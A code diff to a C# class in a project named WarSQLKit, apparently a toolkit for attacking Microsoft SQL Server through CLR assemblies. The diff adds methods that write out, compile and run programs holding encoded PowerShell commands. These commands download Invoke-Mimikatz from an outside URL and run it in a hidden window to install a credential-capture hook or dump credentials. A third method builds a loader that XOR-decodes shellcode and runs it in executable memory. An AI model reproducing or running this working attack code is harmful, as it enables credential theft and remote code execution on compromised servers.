@@ -498,6 +498,227 @@ namespace WarSQLKit
             SqlContext.Pipe.Send("Mimikazt compiled.");
             File.Delete(@"C:\ProgramData\mimiPs.cs");
         }
+        public void SaveMimikatzSsp()
+        {
+            SqlContext.Pipe.Send("Mimikatz C# File is being created.");
+            var strMtr = "using System;" +
+                         "using System.Diagnostics;" +
+                         "using System.Text;" +
+                         "namespace Meterpreter_Test3" +
+                         "{" +
+                         "class Program" +
+                         "{" +
+                         "static void Main(string[] args)" +
+                         "{" +
+                         "RunMimikatz(\"cmd.exe\", \"/c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AcwBhAG0AcgBhAHQAYQBzAGgAbwBrAC8AbgBpAHMAaABhAG4AZwAvAGMANwA1AGQAYQA3AGYAOQAxAGYAYwBjADMANQA2AGYAOAA0ADYAZQAwADkAZQBhAGIAMABjAGYAZAA3AGYAMgA5ADYAZQBiAGYANwA0ADYALwBHAGEAdABoAGUAcgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC4AcABzADEAIgApADsAIAAkAG0AIAA9ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEMAbwBtAG0AYQBuAGQAIAAiAHAAcgBpAHYAaQBsAGUAZwBlADoAOgBkAGUAYgB1AGcAIABtAGkAcwBjADoAOgBtAGUAbQBzAHMAcAAiADsAIAAkAG0A > C:\\\\ProgramData\\\\mimi.log 2>&1\");" +
+                         "}" +
+                         "public static void RunMimikatz(string filename, string arguments)" +
+                         "{" +
+                         "var process = new Process();" +
+                         "process.StartInfo.FileName = filename;" +
+                         "if (!string.IsNullOrEmpty(arguments))" +
+                         "{" +
+                         "process.StartInfo.Arguments = arguments;" +
+                         "}" +
+                         "process.StartInfo.CreateNoWindow = true;" +
+                         "process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;" +
+                         "process.StartInfo.UseShellExecute = false;" +
+                         "process.StartInfo.RedirectStandardError = true;" +
+                         "process.StartInfo.RedirectStandardOutput = true;" +
+                         "var stdOutput = new StringBuilder();" +
+                         "process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);" +
+                         "string stdError = null;" +
+                         "try" +
+                         "{" +
+                         "process.Start();" +
+                         "process.BeginOutputReadLine();" +
+                         "stdError = process.StandardError.ReadToEnd();" +
+                         "process.WaitForExit();" +
+                         "}" +
+                         "catch (Exception e)" +
+                         "{" +
+                         "}" +
+                         "if (process.ExitCode == 0)" +
+                         "{" +
+                         "}" +
+                         "else" +
+                         "{" +
+                         "var message = new StringBuilder();" +
+                         "if (!string.IsNullOrEmpty(stdError))" +
+                         "{" +
+                         "message.AppendLine(stdError);" +
+                         "}" +
+                         "if (stdOutput.Length != 0)" +
+                         "{" +
+                         "message.AppendLine(\"Std output:\");" +
+                         "message.AppendLine(stdOutput.ToString());" +
+                         "}" +
+                         "}" +
+                         "}" +
+                         "}" +
+                         "}";
+            x64NetFrameWorkDirectory();
+            File.WriteAllText(@"C:\ProgramData\MimiSSP.cs", strMtr);
+            SqlContext.Pipe.Send("Mimikatz C# File created.");
+            SqlContext.Pipe.Send("CSharp Compiler is running.");
+            BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe", @" /c C:\Windows\Microsoft.NET\Framework64\" + _x64NetFrameworkList[_x64NetFrameworkList.Count - 1] + @"\csc.exe /unsafe /platform:x64 /out:C:\ProgramData\MimiSSP.exe " + @"C:\ProgramData\MimiSSP.cs");
+            SqlContext.Pipe.Send("Mimikazt compiled.");
+            File.Delete(@"C:\ProgramData\MimiSSP.cs");
+        }
+        public void SaveHookPasswd()
+        {
+            SqlContext.Pipe.Send("Mimikatz C# File is being created.");
+            var strMtr = "using System;" +
+                         "using System.Diagnostics;" +
+                         "using System.Text;" +
+                         "namespace Meterpreter_Test3" +
+                         "{" +
+                         "class Program" +
+                         "{" +
+                         "static void Main(string[] args)" +
+                         "{" +
+                         "RunMimikatz(\"cmd.exe\", \"/c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AcwBhAG0AcgBhAHQAYQBzAGgAbwBrAC8AbgBpAHMAaABhAG4AZwAvAGMANwA1AGQAYQA3AGYAOQAxAGYAYwBjADMANQA2AGYAOAA0ADYAZQAwADkAZQBhAGIAMABjAGYAZAA3AGYAMgA5ADYAZQBiAGYANwA0ADYALwBHAGEAdABoAGUAcgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC4AcABzADEAIgApADsAIAAkAG0AIAA9ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzADsAIAAkAG0A > C:\\\\ProgramData\\\\mimi.log 2>&1\");" +
+                         "}" +
+                         "public static void RunMimikatz(string filename, string arguments)" +
+                         "{" +
+                         "var process = new Process();" +
+                         "process.StartInfo.FileName = filename;" +
+                         "if (!string.IsNullOrEmpty(arguments))" +
+                         "{" +
+                         "process.StartInfo.Arguments = arguments;" +
+                         "}" +
+                         "process.StartInfo.CreateNoWindow = true;" +
+                         "process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;" +
+                         "process.StartInfo.UseShellExecute = false;" +
+                         "process.StartInfo.RedirectStandardError = true;" +
+                         "process.StartInfo.RedirectStandardOutput = true;" +
+                         "var stdOutput = new StringBuilder();" +
+                         "process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);" +
+                         "string stdError = null;" +
+                         "try" +
+                         "{" +
+                         "process.Start();" +
+                         "process.BeginOutputReadLine();" +
+                         "stdError = process.StandardError.ReadToEnd();" +
+                         "process.WaitForExit();" +
+                         "}" +
+                         "catch (Exception e)" +
+                         "{" +
+                         "}" +
+                         "if (process.ExitCode == 0)" +
+                         "{" +
+                         "}" +
+                         "else" +
+                         "{" +
+                         "var message = new StringBuilder();" +
+                         "if (!string.IsNullOrEmpty(stdError))" +
+                         "{" +
+                         "message.AppendLine(stdError);" +
+                         "}" +
+                         "if (stdOutput.Length != 0)" +
+                         "{" +
+                         "message.AppendLine(\"Std output:\");" +
+                         "message.AppendLine(stdOutput.ToString());" +
+                         "}" +
+                         "}" +
+                         "}" +
+                         "}" +
+                         "}";
+            x64NetFrameWorkDirectory();
+            File.WriteAllText(@"C:\ProgramData\mimiPs.cs", strMtr);
+            SqlContext.Pipe.Send("Mimikatz C# File created.");
+            SqlContext.Pipe.Send("CSharp Compiler is running.");
+            BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe", @" /c C:\Windows\Microsoft.NET\Framework64\" + _x64NetFrameworkList[_x64NetFrameworkList.Count - 1] + @"\csc.exe /unsafe /platform:x64 /out:C:\ProgramData\MimiPs.exe " + @"C:\ProgramData\mimiPs.cs");
+            SqlContext.Pipe.Send("Mimikazt compiled.");
+            File.Delete(@"C:\ProgramData\mimiPs.cs");
+        }
+        public void SaveShellcoder()
+        {
+            SqlContext.Pipe.Send("Mimikatz C# File is being created.");
+            var strMtr ="using System;" +
+                        "using System.Runtime.InteropServices;" +
+                        "namespace loader" +
+                        "{" +
+                        "    class Program" +
+                        "    {" +
+                        "        static void Main(string[] args)" +
+                        "        {" +
+                        "            if (args.Length == 0 || args[0].Contains(\"+\") || args[0].Contains(\"/\"))" +
+                        "            {" +
+                        "                Console.WriteLine(\"loader.exe payload\");" +
+                        "                Environment.Exit(0);" +
+                        "            }" +
+                        "            string str = args[0].Replace('-', '+').Replace('_', '/');" +
+                        "            switch (str.Length % 4)" +
+                        "            {" +
+                        "                case 2:" +
+                        "                    str += \"==\";" +
+                        "                    break;" +
+                        "                case 3:" +
+                        "                    str += \"=\";" +
+                        "                    break;" +
+                        "            }" +
+                        "            Console.WriteLine(str);" +
+                        "            byte[] code = xor(Convert.FromBase64String(str));" +
+                        "            execute(code);" +
+                        "        }" +
+                        "        public static byte[] xor(byte[] input)" +
+                        "        {" +
+                        "            char[] key = { 'Y', '4', };" +
+                        "            byte[] output = new byte[input.Length];" +
+                        "            for (int i = 0; i < input.Length; i++)" +
+                        "            {" +
+                        "                output[i] = (byte)(input[i] ^ key[i % key.Length]);" +
+                        "            }" +
+                        "            return output;" +
+                        "        }" +
+                        "        public static bool execute(byte[] shellcode)" +
+                        "        {" +
+                        "            try" +
+                        "            {" +
+                        "                UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" +
+                        "                Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);" +
+                        "                IntPtr hThread = IntPtr.Zero;" +
+                        "                UInt32 threadId = 0;" +
+                        "                IntPtr pinfo = IntPtr.Zero;" +
+                        "" +
+                        "                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);" +
+                        "                WaitForSingleObject(hThread, 0xFFFFFFFF);" +
+                        "" +
+                        "                return true;" +
+                        "            }" +
+                        "            catch (Exception e)" +
+                        "            {" +
+                        "                Console.Error.WriteLine(\"exception: \" + e.Message);" +
+                        "                return false;" +
+                        "            }" +
+                        "        }" +
+                        "        private static UInt32 MEM_COMMIT = 0x1000;" +
+                        "        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;" +
+                        "        [DllImport(\"kernel32\")]" +
+                        "        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr," +
+                        "             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);" +
+                        "        [DllImport(\"kernel32\")]" +
+                        "        private static extern IntPtr CreateThread(" +
+                        "          UInt32 lpThreadAttributes," +
+                        "          UInt32 dwStackSize," +
+                        "          UInt32 lpStartAddress," +
+                        "          IntPtr param," +
+                        "          UInt32 dwCreationFlags," +
+                        "          ref UInt32 lpThreadId" +
+                        "          );" +
+                        "        [DllImport(\"kernel32\")]" +
+                        "        private static extern UInt32 WaitForSingleObject(" +
+                        "          IntPtr hHandle," +
+                        "          UInt32 dwMilliseconds" +
+                        "        );" +
+                        "    }" +
+                        "}";
+            x64NetFrameWorkDirectory();
+            File.WriteAllText(@"C:\ProgramData\loader.cs", strMtr);
+            BuildRunMeterpreter(@"C:\Windows\System32\cmd.exe", @" /c C:\Windows\Microsoft.NET\Framework64\" + _x64NetFrameworkList[_x64NetFrameworkList.Count - 1] + @"\csc.exe /unsafe /platform:x64 /out:C:\ProgramData\loader.exe " + @"C:\ProgramData\loader.cs");
+            File.Delete(@"C:\ProgramData\loader.cs");
+        }
         public static void NetFrameWorkDirectory()
         {
             _netFrameworkList.Clear();
